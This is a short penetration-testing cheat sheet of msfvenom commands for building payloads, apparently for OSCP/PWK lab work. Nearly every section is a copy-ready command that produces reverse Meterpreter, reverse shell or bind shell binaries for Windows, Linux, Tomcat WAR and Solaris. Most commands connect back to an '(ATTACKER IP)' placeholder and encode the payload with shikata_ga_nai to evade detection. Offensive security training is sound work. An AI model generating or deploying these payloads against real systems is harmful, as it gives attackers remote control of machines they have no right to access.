# MSFVenom Cheat Sheet
This sheet is for all of the use-case scenarios in which I have and will use MSFVenom during a penetration test for generating payloads for systems. One ting to note, is that these payloads can be used more than once, obviously. I would recommend not re-generating a payload each time you compromise a service on a target server. Use a naming convention, such as:

`OS`+`TYPE`+`PORT`.extension

For instance, a Linux ELF binary, Bind Shell, Binds to port 4567 would be, `LinBind4567.elf`. Windows ELF binary, Reverse Meterpreter, returns to port 5555 would be, `WinRevMeter5555.exe`. Keep these payloads readily available as time is of the essence. 

If you are working the Offensive Security PWK labs, make sure that you don't use Meterpreter when possible as [they do not condone it and it is not allowed in the exam.](https://support.offensive-security.com/#!oscp-exam-guide.mdhttps://support.offensive-security.com/#!oscp-exam-guide.md) Hey, if it's confusing - think about it this way, some people still buy vinyl records for nostalgia, I guess not adopting new tools and methods is their thing. 

## WINDOWS
This section is for all Windows binary creation techniques used with MSFVenom
### Meterpreter Reverse
To make the victim server or system connect back to the attacker and send meterpreter to be spawned by the handler running on the attacker machine.
1. Generate the MSFVenom Reverse Meterpreter payload:

`./msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=(ATTACKER IP) LPORT=6666 -b '\x00' -e x86/shikata_ga_nai -f exe -o /ftphome/shell.exe`

## LINUX
This section is for all LINUX binary creation techniques used with MSFVenom
### Meterpreter Reverse
`./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(ATTACKER IP) LPORT=5555 -a x86 --platform=linux -f elf -b '\x00' -o shell.o`
### Bind Shell Port 4567
`./msfvenom --platform=linux --payload=linux/x86/shell_bind_tcp -e x86/shikata_ga_nai -b '\x00' -f elf LPORT=4567 > LinBind4567.elf`
### Python Stand Alone CMD
This will create a file with the Python command to run from your remote shell.

`msfvenom -p cmd/unix/reverse_python LHOST=(ATTACKER IP ADDRESS) LPORT=(LOCAL PORT) -f raw > RevBind443.py` 

## JAVA TOMCAT
### .WAR File
`./msfvenom --platform=(OS TYPE) --payload=java/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=6666 -f war -o shell.war`

## SunOS (Solaris)
### Elf File
`/msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf`
